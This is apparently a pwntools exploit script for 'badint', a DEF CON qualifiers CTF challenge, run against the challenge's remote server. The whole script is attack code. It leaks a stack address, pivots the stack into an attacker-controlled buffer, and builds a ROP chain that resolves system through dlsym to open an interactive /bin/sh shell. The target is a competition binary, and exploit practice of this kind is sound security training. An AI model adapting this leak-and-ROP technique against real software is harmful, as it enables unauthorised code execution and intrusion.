from pwn import *

context.log_level = "DEBUG"

#p = process('./badint')
p = remote('badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me', 21813)

p.recv()

# stack leak
p.sendline('0')
p.recv()
p.sendline('0')
p.recv()
p.sendline('A'*512)
p.recvuntil(']')
stack = u64(p.recv(16).decode('hex')[::-1])
print "stack:", hex(stack)
p.recvuntil('SEQ #')


# pivot rsp to a lot of stack data we control
p.sendline('0') # seq
p.recv()
p.sendline(str(256-0x20)) # offset
p.recv()

saved_bp = stack-32
our_buf = stack+144+0x1d8-0x48
pop_5x = 0x000000000040252d

print "saved bp:", hex(saved_bp)
print "our buf:", hex(our_buf)

pop_rdi = 0x0000000000402533
pop_rsi_r15 = 0x0000000000402531
call_rax = 0x0000000000400ccd
dlsym = 0x400B90
# overwrite 
            # v-- dest - 0x8                   # val
thing = p64(saved_bp - 8).encode('hex') + p64(our_buf).encode('hex')
thing += p64(0x604000).encode('hex') # ptr_to_n_elems
thing += '1' * (472-0x30-len(thing))

ptr_to_system = our_buf + 8*10
ptr_to_bin_sh = ptr_to_system + len("system\x00")
thing += p64(pop_rdi) + p64(0)
thing += p64(pop_rsi_r15) + p64(ptr_to_system) + p64(0)
thing += p64(dlsym)
thing += p64(pop_rdi) + p64(ptr_to_bin_sh)
thing += p64(call_rax)

thing += "system\x00"
thing += "/bin/sh\x00"

print len(thing)

p.sendline(thing)
p.recv()
p.sendline('Yes') # Last seg

p.interactive()
